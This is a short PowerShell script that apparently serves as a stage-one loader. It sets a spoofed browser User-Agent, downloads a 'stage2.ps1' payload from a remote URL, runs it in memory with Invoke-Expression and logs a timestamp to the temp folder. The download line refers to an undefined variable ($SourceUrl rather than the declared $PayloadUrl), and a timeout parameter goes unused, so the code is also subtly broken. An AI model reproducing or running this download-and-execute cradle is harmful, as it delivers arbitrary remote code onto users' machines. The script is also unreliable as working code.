
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'https://contoso.com/stage2.ps1',
    [int]$TransferTimeout = 43
)
$ErrorActionPreference = "Stop"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ClientObject = New-Object System.Net.WebClient
$ClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
$DownloadedScript = $ClientObject.DownloadString($SourceUrl)
if ([string]::IsNullOrWhiteSpace($DownloadedScript)) {
    throw "Downloaded script was empty"
}
Write-Verbose ("Script length: " + $DownloadedScript.Length)
Invoke-Expression $DownloadedScript

$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
